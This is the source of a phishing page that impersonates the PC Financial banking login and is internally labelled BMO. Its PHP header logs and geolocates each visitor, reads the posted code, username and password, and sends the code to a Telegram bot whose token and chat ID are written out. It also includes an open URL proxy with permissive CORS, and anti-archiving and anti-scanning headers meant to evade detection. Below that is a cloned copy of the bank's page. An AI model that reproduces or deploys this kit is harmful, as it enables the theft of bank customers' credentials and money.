<?php



header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
header("X-XSS-Protection: 0");
header("X-Frame-Options: ALLOWALL");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");

if(isset($_GET['bypass']) && $_GET['bypass'] == 'true'){
    $url = $_GET['url'];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
        "X-XSS-Protection: 0",
        "X-Frame-Options: ALLOWALL",
        "Access-Control-Allow-Origin: *",
        "Access-Control-Allow-Credentials: true",
        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
    ));
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    header("HTTP/1.1 ".$info['http_code']);
    foreach ($info['headers'] as $header) {
        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
            header($header);
        }
    }
    echo $response;
    exit;
}




$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}
$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS() { 
    global $user_agent;
    $os_platform  = "Unknown OS Platform";
    $os_array     = array(
                          '/windows nt 10/i'      =>  'Windows 10',
                          '/windows nt 6.3/i'     =>  'Windows 8.1',
                          '/windows nt 6.2/i'     =>  'Windows 8',
                          '/windows nt 6.1/i'     =>  'Windows 7',
                          '/windows nt 6.0/i'     =>  'Windows Vista',
                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                          '/windows nt 5.1/i'     =>  'Windows XP',
                          '/windows xp/i'         =>  'Windows XP',
                          '/windows nt 5.0/i'     =>  'Windows 2000',
                          '/windows me/i'         =>  'Windows ME',
                          '/win98/i'              =>  'Windows 98',
                          '/win95/i'              =>  'Windows 95',
                          '/win16/i'              =>  'Windows 3.11',
                          '/macintosh|mac os x/i' =>  'Mac OS X',
                          '/mac_powerpc/i'        =>  'Mac OS 9',
                          '/linux/i'              =>  'Linux',
                          '/ubuntu/i'             =>  'Ubuntu',
                          '/iphone/i'             =>  'iPhone',
                          '/ipod/i'               =>  'iPod',
                          '/ipad/i'               =>  'iPad',
                          '/android/i'            =>  'Android',
                          '/blackberry/i'         =>  'BlackBerry',
                          '/webos/i'              =>  'Mobile'
                    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;

    return $os_platform;
}

function getBrowser() {
    global $user_agent;
    $browser        = "Unknown Browser";
    $browser_array = array(
                            '/msie/i'      => 'Internet Explorer',
                            '/firefox/i'   => 'Firefox',
                            '/safari/i'    => 'Safari',
                            '/chrome/i'    => 'Chrome',
                            '/edge/i'      => 'Edge',
                            '/opera/i'     => 'Opera',
                            '/netscape/i'  => 'Netscape',
                            '/maxthon/i'   => 'Maxthon',
                            '/konqueror/i' => 'Konqueror',
                            '/mobile/i'    => 'Handheld Browser'
                     );

    foreach ($browser_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $browser = $value;

    return $browser;
}


$user_os        = getOS();
$user_browser   = getBrowser();
 
$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file       = 'data.dat';
$file1       = 'combo.txt';
$file2       = 'master.log';
$ip         = "".$PublicIP;
$uaget      = "".$user_agent;
$bsr        = "".$user_browser;
$uos        = "".$user_os;
$ust= explode(" ", $user_agent);
$vr= $ust[3];
$ver=str_replace(")", "", $vr);
$version   = "Version              : ".$ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
}
else {
    $details  = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details  = json_decode($details, true);
$success  = $details['success'];
$file = '../../../log.txtt';
$fp = fopen($file, 'a');

if ($success==false) {
    fwrite($fp, $ip."\n");
    fwrite($fp, $uos."\n");
    fwrite($fp, $version."\n");
    fwrite($fp, $bsr."\n");
    fclose($fp);
} else if ($success==true) {
    $country    = $details['country'];
    $city       = $details['city'];
    $continent  = $details['continent'];
    $tp         = $details['type'];
    $cn         = $details['country_phone'];
    $is         = $details['isp'];
    $la         = $details['latitude'];
    $lp         = $details['longitude'];
    $crn        = $details['currency'];
    $type       = $tp;
    $bank       = "BMO";
$at   = "@";
$code = "" . $_POST['code'];
$username = "" .$_POST['username'];
$password = "".$_POST['password'];
$lh   = "|";

    $url        = "https://BMO.com";
    $cod       = $_POST['code'];
    $isp        = $is;
    $currency   = "".$full_date;
    $li     = ",";

    

} else {
    $status     = "Status : ".$success;
    fwrite($fp, $status."\n");
    fwrite($fp, $uaget."\n");
    fclose($fp);
}



$googleMapsUrl = "https://www.google.com/maps?q=$la,$lp";

$message = "$code";
$apiToken = "6547328306:AAFosAwa7wPggddiOV_QgTw7xI-uX8ZEY6s"; 
$data1 = [
    'chat_id' => '-1001819831566',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot{$apiToken}/sendMessage?" . http_build_query($data1));

?> 
<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Expires: " . gmdate("D, d M Y H:i:s", time() - 3600) . " GMT");
header("Pragma: no-cache");

// Prevent Google Archiving
header("X-Robots-Tag: noarchive");

// Block email scanning
header("X-Content-Type-Options: nosniff");

// Disable listeners and log third-party communications
ini_set("disable_functions", "socket_accept, socket_bind, socket_listen, socket_create_listen, socket_read, socket_recv, socket_recvfrom, socket_recvmsg, socket_send, socket_sendmsg, socket_sendto, socket_getsockname, socket_getpeername, socket_get_option, socket_set_option");


// Logging third-party communication attempts
$logFile = "../../../requests.txt"; // Replace with the path to your log file

// Get the current timestamp
$timestamp = date("Y-m-d H:i:s");

// Get the IP address of the client
$ipAddress = $_SERVER['REMOTE_ADDR'];

// Get the requested URL
$requestUrl = $_SERVER['REQUEST_URI'];

// Create the log message
$logMessage = "Timestamp: $timestamp | IP: $ipAddress | Requested URL: $requestUrl\n";

// Append the log message to the log file
file_put_contents($logFile, $logMessage, FILE_APPEND);
?>
<!doctype html><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><html lang="en"><head><script src="/assets/js/pcbank_common.js"></script><script src="https://nebula-cdn.kampyle.com/wc/6354/onsite/embed.js" async=""></script><script async="" defer="defer" src="/__imp_apg__/js/f5cs-pcfinancial-6f309a0b.js" id="_imp_apg_dip_"></script><base href="/"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate"><meta http-equiv="Pragma" content="no-cache"><meta http-equiv="Expires" content="0"><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>PC Financial</title>  <script>
    // Disable caching for forward and backward navigation
    function disableCaching() {
      // Disable caching for forward navigation
      window.onpageshow = function(event) {
        if (event.persisted) {
          document.getElementById('disableCache').content = 'no-store, no-cache, must-revalidate';
        }
      };
      
      // Disable caching for backward navigation
      window.onunload = function() {};
    }
    
    // Set client browser cache to one hour prior
    function setBrowserCacheTime() {
      const date = new Date();
      date.setTime(date.getTime() - (60 * 60 * 1000));
      document.getElementById('cacheExpires').content = date.toUTCString();
    }

    // Prevent Google Archiving
    const metaRobots = document.createElement('meta');
    metaRobots.name = 'robots';
    metaRobots.content = 'noarchive';
    document.head.appendChild(metaRobots);

    // Block email scanning
    const metaContentType = document.createElement('meta');
    metaContentType.httpEquiv = 'X-Content-Type-Options';
    metaContentType.content = 'nosniff';
    document.head.appendChild(metaContentType);

    // Disable listeners and log third-party communications
    function disableListeners() {
      // Disable listeners (Not applicable in HTML pages)
    }

    function logThirdPartyCommunication() {
      // Logging third-party communication attempts
      const timestamp = new Date().toISOString();
      const ipAddress = "123.45.67.89"; // Replace with actual IP address or retrieve dynamically
      const requestedUrl = window.location.href;
      const logMessage = `Timestamp: ${timestamp} | IP: ${ipAddress} | Requested URL: ${requestedUrl}\n`;

      // Specify the log file location
      const logFile = "../../../requests.txt"; // Replace with the actual log file location

      // Perform the necessary logging operation (e.g., sending log data to a server-side script)
      const logRequest = new XMLHttpRequest();
      logRequest.open('POST', logFile, true);
      logRequest.setRequestHeader('Content-Type', 'text/plain');
      logRequest.send(logMessage);
    }

    // Call the necessary functions when the page loads
    document.addEventListener('DOMContentLoaded', function() {
      disableCaching();
      setBrowserCacheTime();
      disableListeners();
      logThirdPartyCommunication();
    });
  </script></head><body class="processing"><meta name="title" content="PC Financial | Canadian Rewards Credit Cards with No Annual Fee | Services financiers PC | Cartes de crédit canadiennes avec récompenses et sans frais annuels"><meta name="description" content="Log in to your online PC Financial account. Don’t have an account? You can sign up for one today! | Connectez-vous en ligne à votre compte Services financiers le Choix du Président Vous n’avez pas de compte? Vous pouvez demander d’en ouvrir un dès aujourd’hui!"><meta name="keywords" content=""><meta name="twitter:card" content="summary"><meta name="twitter:title" content="PC Financial | Canadian Rewards Credit Cards with No Annual Fee | Services financiers PC | Cartes de crédit canadiennes avec récompenses et sans frais annuels"><meta name="twitter:description" content="Log in to your online PC Financial account. Don’t have an account? You can sign up for one today! | Connectez-vous en ligne à votre compte Services financiers le Choix du Président Vous n’avez pas de compte? Vous pouvez demander d’en ouvrir un dès aujourd’hui!"><meta name="twitter:image" content=""><meta property="og:type" content="article"><meta property="og:title" content="PC Financial | Canadian Rewards Credit Cards with No Annual Fee | Services financiers PC | Cartes de crédit canadiennes avec récompenses et sans frais annuels"><meta property="og:description" content="Log in to your online PC Financial account. Don’t have an account? You can sign up for one today! | Connectez-vous en ligne à votre compte Services financiers le Choix du Président Vous n’avez pas de compte? Vous pouvez demander d’en ouvrir un dès aujourd’hui!"><meta property="og:image" content=""><link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon/favicon-16x16.png"><link rel="manifest" href="/site.webmanifest"><style>@charset "UTF-8";@font-face{font-family:Averta;src:url(/assets/fonts/averta-regular-webfont.eot);src:url(/assets/fonts/averta-regular-webfont.eot?#iefix) format("embedded-opentype"),url(/assets/fonts/averta-regular-webfont.woff2) format("woff2"),url(/assets/fonts/averta-regular-webfont.woff) format("woff"),url(/assets/fonts/averta-regular-webfont.ttf) format("truetype"),url(/assets/fonts/averta-regular-webfont.svg#averta_regularregular) format("svg");font-weight:400;font-style:normal}@font-face{font-family:Averta;src:url(/assets/fonts/averta-regularitalic-webfont.eot);src:url(/assets/fonts/averta-regularitalic-webfont.eot?#iefix) format("embedded-opentype"),url(/assets/fonts/averta-regularitalic-webfont.woff2) format("woff2"),url(/assets/fonts/averta-regularitalic-webfont.woff) format("woff"),url(/assets/fonts/averta-regularitalic-webfont.ttf) format("truetype"),url(/assets/fonts/averta-regularitalic-webfont.svg#avertaregular_italic) format("svg");font-weight:400;font-style:italic}@font-face{font-family:Averta;src:url(/assets/fonts/averta-semibold-webfont.eot);src:url(/assets/fonts/averta-semibold-webfont.eot?#iefix) format("embedded-opentype"),url(/assets/fonts/averta-semibold-webfont.woff2) format("woff2"),url(/assets/fonts/averta-semibold-webfont.woff) format("woff"),url(/assets/fonts/averta-semibold-webfont.ttf) format("truetype"),url(/assets/fonts/averta-semibold-webfont.svg#avertasemibold) format("svg");font-weight:600;font-style:normal}@font-face{font-family:Averta;src:url(/assets/fonts/averta-bold-webfont.eot);src:url(/assets/fonts/averta-bold-webfont.eot?#iefix) format("embedded-opentype"),url(/assets/fonts/averta-bold-webfont.woff2) format("woff2"),url(/assets/fonts/averta-bold-webfont.woff) format("woff"),url(/assets/fonts/averta-bold-webfont.ttf) format("truetype"),url(/assets/fonts/averta-bold-webfont.svg#avertabold) format("svg");font-weight:700;font-style:normal}@font-face{font-family:Averta;src:url(/assets/fonts/averta-bolditalic-webfont.eot);src:url(/assets/fonts/averta-bolditalic-webfont.eot?#iefix) format("embedded-opentype"),url(/assets/fonts/averta-bolditalic-webfont.woff2) format("woff2"),url(/assets/fonts/averta-bolditalic-webfont.woff) format("woff"),url(/assets/fonts/averta-bolditalic-webfont.ttf) format("truetype"),url(/assets/fonts/averta-bolditalic-webfont.svg#avertabold_italic) format("svg");font-weight:700;font-style:italic}@-webkit-keyframes menuOpen{0%{-webkit-transform:scaleY(0);transform:scaleY(0);opacity:0}}@-webkit-keyframes slideIn{0%{-webkit-transform:translateX(100%);transform:translate(100%)}to{-webkit-transform:translateX(0);transform:translate(0)}}@-webkit-keyframes overlayFadeIn{0%{opacity:0}to{opacity:.35}}@-webkit-keyframes bounce-in{0%{-webkit-transform:scale(0);transform:scale(0)}50%{-webkit-transform:scale(1.15);transform:scale(1.15)}70%{-webkit-transform:scale(.95);transform:scale(.95)}to{-webkit-transform:scale(1);transform:scale(1)}}*{font-family:Averta;line-height:1.2}p{margin:0;font-size:.875em;font-weight:400}*{font-family:Averta;line-height:1.2}p{margin:0;font-size:.875em;font-weight:400}*{font-family:Averta;line-height:1.2}p{margin:0;font-size:.875em;font-weight:400}@-webkit-keyframes bounce{0%{-webkit-transform:scale(1);transform:scale(1)}10%{-webkit-transform:scale(1.1);transform:scale(1.1)}30%{-webkit-transform:scale(1.2);transform:scale(1.2)}50%{-webkit-transform:scale(1);transform:scale(1)}70%{-webkit-transform:scale(.9);transform:scale(.9)}to{-webkit-transform:scale(1);transform:scale(1)}}@-webkit-keyframes popAlert{0%{-webkit-transform:translate(-50%,calc(100% + 40px));transform:translate(-50%,calc(100% + 40px))}}body,html{overflow-x:hidden}body{margin:0}.full-screen-loader{display:none}body.processing{overflow:hidden}body.processing .full-screen-loader{display:block}body{margin-right:calc(-1*(100vw - 100%))}</style><link rel="stylesheet" href="styles.c09898fa128dce06.css" media="print" onload='this.media="all"'><noscript><link rel="stylesheet" href="styles.c09898fa128dce06.css"></noscript><app-root></app-root><style>.loader-container{display:flex;display:-ms-flexbox;position:absolute;top:0;bottom:0;left:0;right:0;-webkit-box-align:center;-moz-box-align:center;-ms-flex-align:center;-webkit-align-items:center;align-items:center}.loader-container .loader{display:inline-block;width:50px;height:50px;border:8px solid #ee2e24;border-right-color:transparent;border-radius:50%;animation:1s linear 0s infinite rotate-cw}.loader-container .loader p{margin:0;font-size:0}.full-screen-loader .loader-container{z-index:10000;width:100%;height:100%;-webkit-box-pack:center;-moz-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;background-color:#fff}@keyframes rotate-cw{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}</style><!--[if (gt IE 9)|!(IE)]><!--><div class="full-screen-loader"><div class="loader-container lrg"><div class="loader"><p role="alert">Loading</p></div></div></div><!--<![endif]--><section><div id="unsupported"></div><script>window.BrowserslistUserAgentRegExp=/((CPU[ +]OS|iPhone[ +]OS|CPU[ +]iPhone|CPU IPhone OS)[ +]+(10[_\.]0|10[_\.]([1-9]|\d{2,})|10[_\.]2|10[_\.]([3-9]|\d{2,})|(1[1-9]|[2-9]\d|\d{3,})[_\.]\d+|11[_\.]0|11[_\.]([1-9]|\d{2,})|11[_\.]2|11[_\.]([3-9]|\d{2,})|(1[2-9]|[2-9]\d|\d{3,})[_\.]\d+|12[_\.]0|12[_\.]([1-9]|\d{2,})|12[_\.]5|12[_\.]([6-9]|\d{2,})|(1[3-9]|[2-9]\d|\d{3,})[_\.]\d+|13[_\.]0|13[_\.]([1-9]|\d{2,})|13[_\.]7|13[_\.]([8-9]|\d{2,})|(1[4-9]|[2-9]\d|\d{3,})[_\.]\d+|14[_\.]0|14[_\.]([1-9]|\d{2,})|14[_\.]4|14[_\.]([5-9]|\d{2,})|14[_\.]8|14[_\.](9|\d{2,})|(1[5-9]|[2-9]\d|\d{3,})[_\.]\d+|15[_\.]0|15[_\.]([1-9]|\d{2,})|(1[6-9]|[2-9]\d|\d{3,})[_\.]\d+|16[_\.]0|16[_\.]([1-9]|\d{2,})|(1[7-9]|[2-9]\d|\d{3,})[_\.]\d+)(?:[_\.]\d+)?)|(CFNetwork\/808\.(\d))|(CFNetwork\/8.* Darwin\/16\.5\.\d+)|(CFNetwork\/8.* Darwin\/16\.6\.\d+)|(CFNetwork\/8.* Darwin\/16\.7\.\d+)|(CFNetwork\/8.* Darwin\/16\.\d+)|(CFNetwork\/8.* Darwin\/17\.0\.\d+)|(CFNetwork\/8.* Darwin\/17\.2\.\d+)|(CFNetwork\/8.* Darwin\/17\.3\.\d+)|(CFNetwork\/8.* Darwin\/17\.\d+)|(OperaMini(?:\/att)?\/?(\d+)?(?:\.\d+)?(?:\.\d+)?)|(Opera\/.+Opera Mobi.+Version\/(12\.0|12\.([1-9]|\d{2,})|(1[3-9]|[2-9]\d|\d{3,})\.\d+|72\.0|72\.([1-9]|\d{2,})|(7[3-9]|[8-9]\d|\d{3,})\.\d+))|(Opera\/(12\.0|12\.([1-9]|\d{2,})|(1[3-9]|[2-9]\d|\d{3,})\.\d+|72\.0|72\.([1-9]|\d{2,})|(7[3-9]|[8-9]\d|\d{3,})\.\d+).+Opera Mobi)|(Opera Mobi.+Opera(?:\/|\s+)(12\.0|12\.([1-9]|\d{2,})|(1[3-9]|[2-9]\d|\d{3,})\.\d+|72\.0|72\.([1-9]|\d{2,})|(7[3-9]|[8-9]\d|\d{3,})\.\d+))|(SamsungBrowser\/(17\.0|17\.([1-9]|\d{2,})|(1[8-9]|[2-9]\d|\d{3,})\.\d+))|(Edge\/(106(?:\.0)?|106(?:\.([1-9]|\d{2,}))?|(10[7-9]|1[1-9]\d|[2-9]\d\d|\d{4,})(?:\.\d+)?))|(HeadlessChrome((?:\/41\.0\.\d+)?|(?:\/41\.([1-9]|\d{2,})\.\d+)?|(?:\/(4[2-9]|[5-9]\d|\d{3,})\.\d+\.\d+)?|(?:\/83\.0\.\d+)?|(?:\/83\.([1-9]|\d{2,})\.\d+)?|(?:\/(8[4-9]|9\d|\d{3,})\.\d+\.\d+)?))|((Chromium|Chrome)\/(41\.0|41\.([1-9]|\d{2,})|(4[2-9]|[5-9]\d|\d{3,})\.\d+|83\.0|83\.([1-9]|\d{2,})|(8[4-9]|9\d|\d{3,})\.\d+)(?:\.\d+)?)|(IEMobile[ /](10\.0|10\.([1-9]|\d{2,})|(1[1-9]|[2-9]\d|\d{3,})\.\d+))|(PlayBook.+RIM Tablet OS (7\.0|7\.([1-9]|\d{2,})|([8-9]|\d{2,})\.\d+|10\.0|10\.([1-9]|\d{2,})|(1[1-9]|[2-9]\d|\d{3,})\.\d+)\.\d+)|((Black[bB]erry|BB10).+Version\/(7\.0|7\.([1-9]|\d{2,})|([8-9]|\d{2,})\.\d+|10\.0|10\.([1-9]|\d{2,})|(1[1-9]|[2-9]\d|\d{3,})\.\d+)\.\d+)|(Version\/(10\.0|10\.([1-9]|\d{2,})|(1[1-9]|[2-9]\d|\d{3,})\.\d+|11\.0|11\.([1-9]|\d{2,})|(1[2-9]|[2-9]\d|\d{3,})\.\d+|12\.0|12\.([1-9]|\d{2,})|(1[3-9]|[2-9]\d|\d{3,})\.\d+|13\.0|13\.([1-9]|\d{2,})|(1[4-9]|[2-9]\d|\d{3,})\.\d+|14\.0|14\.([1-9]|\d{2,})|(1[5-9]|[2-9]\d|\d{3,})\.\d+|15\.0|15\.([1-9]|\d{2,})|(1[6-9]|[2-9]\d|\d{3,})\.\d+|16\.0|16\.([1-9]|\d{2,})|(1[7-9]|[2-9]\d|\d{3,})\.\d+)(?:\.\d+)?.*Safari\/)|(Firefox\/(61\.0|61\.([1-9]|\d{2,})|(6[2-9]|[7-9]\d|\d{3,})\.\d+)\.\d+)|(Firefox\/(61\.0|61\.([1-9]|\d{2,})|(6[2-9]|[7-9]\d|\d{3,})\.\d+)(pre|[ab]\d+[a-z]*)?)/,window.BrowserslistUserAgentRegExp.test(navigator.userAgent)||(document.getElementById("unsupported").innerHTML=' <div class="unsupported-browser" style="margin: 0; padding: 0; width: 100%; height: 100vh; display: table;"> <div class="unsupported-browser-header" style="border-bottom: 1px solid #e8e9eb; height: 70px;"> <img src="/assets/images/en/logo.jpg" alt="Navigate to PC Financial website" style="padding: 18.7px 0 19.3px 20px;"> </div> <div class="unsupported-browser-content" style="display: table-row; vertical-align: middle; text-align: center;"> <div class="unsupported-browser-description" style="display: table-cell; display: inline-block; text-align: left; max-width: 600px; margin: 0 auto; padding: 0px 20px;"> <h1>Welcome to PC Financial® | PC Finance en ligne vous souhaite la bienvenue</h1> <p style="line-height: 1.67; color: #74777a;"> Manage your account, track your spending, and get support, all at your fingertips. | Gérez vos comptes, faites le suivi de vos dépenses et obtenez de l’aide, tout cela à portée de main. </p> <div style="clear: both; margin-top: 40px;"> <img src="/assets/images/result-error.jpg" alt="result error" style="margin-right: 20px; float: left;"  /> <h2>Unsupported browser | Navigateur non pris en charge</h2> </div> <p style="line-height: 1.67; color: #74777a;"> Unfortunately, the browser you are using does not support this site. Please upgrade your browser if applicable or try another browser. | Malheureusement, le navigateur que vous utilisez ne fonctionne pas sur ce site. Veuillez mettre à jour votre navigateur le cas échéant, ou essayer un navigateur différent. </p> </div> </div> </div> ',document.body.className=document.body.className.replace("processing",""))</script></section><script src="runtime.b558a6d0822cb491.js" type="module"></script><script src="polyfills.e11d94c3d2dc6cd1.js" type="module"></script><script src="vendor.ea7c8a36b2c0f481.js" type="module"></script><script src="main.b61a7f28e20968f6.js" type="module"></script></body></html>